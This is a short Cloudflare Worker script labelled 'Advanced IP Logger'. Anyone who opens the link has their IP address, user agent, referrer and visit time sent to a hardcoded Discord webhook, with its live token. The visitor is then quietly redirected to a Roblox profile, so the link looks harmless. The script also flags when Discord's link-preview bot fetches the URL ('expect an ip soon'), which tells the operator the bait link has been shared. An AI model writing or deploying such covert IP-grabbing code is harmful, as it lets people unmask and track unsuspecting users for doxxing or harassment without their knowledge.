export default {
  async fetch(request, env, ctx) {
    // Get visitor IP information
    const cfConnectingIP = request.headers.get('CF-Connecting-IP') || 'Unknown IP'
    const xRealIP = request.headers.get('X-Real-IP') || 'Unknown'
    
    const userAgent = request.headers.get('User-Agent') || 'Unknown'
    const referer = request.headers.get('Referer') || 'Direct visit'
    const time = new Date().toLocaleString()
    
    // Check if the request is from Discord's bot
    const isDiscordBot = userAgent.includes('Discordbot') || userAgent.includes('discordapp.com')
    
    // Create different embed based on whether it's Discord or a real visitor
    let embedData;
    
    if (isDiscordBot) {
      // Simpler notification for Discord bot
      embedData = {
        embeds: [{
          title: "Link was sent somewhere in a chat",
          color: 3447003, // Discord blue color
          footer: { text: "expect an ip soon" }
        }]
      }
    } else {
      // Format IP information in a tree-branch style
      const ipTreeFormat = `
└─── IP Information
    ├─── CF-Connecting-IP: ${cfConnectingIP}
    └─── X-Real-IP: ${xRealIP}
`;
      
      // Format other information in a tree-branch style
      const otherInfoFormat = `
└─── Request Details
    ├─── User Agent: ${userAgent}
    ├─── Referrer: ${referer}
    └─── Time: ${time}
`;
      
      // Full notification for real visitors with tree-branch design
      embedData = {
        embeds: [{
          title: "🌲 New Visitor Detected 🌲",
          color: 5814783,
          description: `\`\`\`${ipTreeFormat}${otherInfoFormat}\`\`\``,
          footer: { text: "Advanced IP Logger" }
        }]
      }
    }

    // Send data to Discord webhook
    await fetch('https://discord.com/api/webhooks/1378847138863386756/UTFk1TAxt_zaQh-gOqZ3DyCYVmSz4od7vYfGwqYYWRtu8xZ1sPRz4Z7yeaGnyYTT0tSi', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(embedData)
    }).catch(err => {
      // Handle errors silently
      console.error('Error sending webhook:', err)
    })

    // Redirect visitor to Roblox profile
    return Response.redirect('https://www.roblox.com/users/4598039640/profile', 302)
  }
}